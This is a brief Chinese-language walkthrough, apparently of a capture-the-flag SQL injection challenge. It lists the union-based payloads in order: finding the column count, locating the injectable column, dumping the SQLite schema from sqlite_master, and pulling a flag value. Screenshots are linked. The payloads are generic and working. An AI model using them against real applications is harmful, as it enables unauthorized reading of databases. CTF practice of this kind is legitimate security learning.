sql注入
-
```
1' order by 2; 两列
```
```
1' union select 1,2;  注入点在第二列
```
![image](https://github.com/xhsy0314/Task/assets/84487619/eb055036-2882-4638-b338-405d6c2e1b38)

```
1' union select 1,group_concat(sql) from sqlite_master;
```
![image](https://github.com/xhsy0314/Task/assets/84487619/50ffb106-0610-46c8-a8e1-0b9ea4db5493)

```
-1' union select 1,group_concat(flaaag) from flaaaaa_aag;
```
![image](https://github.com/xhsy0314/Task/assets/84487619/67694d40-feb4-411a-8b83-9fc80e74ea8a)
